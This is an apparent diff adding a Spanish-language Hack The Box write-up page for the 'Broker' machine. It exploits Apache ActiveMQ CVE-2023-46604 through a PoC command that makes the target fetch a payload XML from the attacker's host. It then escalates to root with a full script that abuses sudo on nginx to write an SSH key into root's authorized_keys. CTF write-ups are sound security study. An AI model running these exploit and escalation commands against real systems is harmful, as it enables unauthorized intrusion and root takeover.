@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Broker HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/broker/pasted-20260403174420.png" alt="Broker HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Broker</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>nginx</span>
+            <span>sudoers</span>
+            <span>apache_activeMQ</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Servicio Apache ActiveMQ expuesto</li>
+            <li><code>Explotación</code>: CVE-2023-46604 en ActiveMQ mediante PoC remoto</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers permite abusar de <code>nginx</code> para escribir claves SSH de root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260403174645.png" alt="Broker HTB" />
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260403174837.png" alt="Broker HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260404114544.png" alt="Broker HTB" />
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260404114604.png" alt="Broker HTB" />
+          <p><a href="https://github.com/pulentoski/CVE-2023-46604">Exploit de GitHub</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code># Servir poc.xml con Python
+# Listener en puerto 443
+# Exploit
+python3 CVE-2023-46604.py -i 10.129.13.118 -u http://10.10.16.157/poc.xml</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260404114721.png" alt="Broker HTB" />
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260404114736.png" alt="Broker HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoers</h2>
+          <div class="code-card">
+            <h3>Enumerar sudoers</h3>
+            <pre><code>sudo -l</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260404115615.png" alt="Broker HTB" />
+          <p><a href="https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406">PoC de GitHub</a></p>
+          <div class="code-card">
+            <h3>exploit.sh</h3>
+            <pre><code>echo "[+] Creating configuration..."
+cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+        worker_connections 768;
+}
+http {
+	server {
+	        listen 1339;
+	        root /;
+	        autoindex on;
+	        dav_methods PUT;
+	}
+}
+EOF
+echo "[+] Loading configuration..."
+sudo nginx -c /tmp/nginx_pwn.conf
+echo "[+] Generating SSH Key..."
+ssh-keygen
+echo "[+] Display SSH Private Key for copy..."
+cat .ssh/id_rsa
+echo "[+] Add key to root user..."
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
+echo "[+] Use the SSH key to get access"</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar exploit</h3>
+            <pre><code>chmod +x exploit.sh
+./exploit.sh</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Conectarnos como root con las claves ssh generadas</h3>
+            <pre><code>chmod 600 /home/activemq/.ssh/id_rsa
+ssh -i /home/activemq/.ssh/id_rsa root@localhost</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/broker/pasted-20260404115540.png" alt="Broker HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>nginx</span>
+            <span>sudoers</span>
+            <span>apache_activeMQ</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
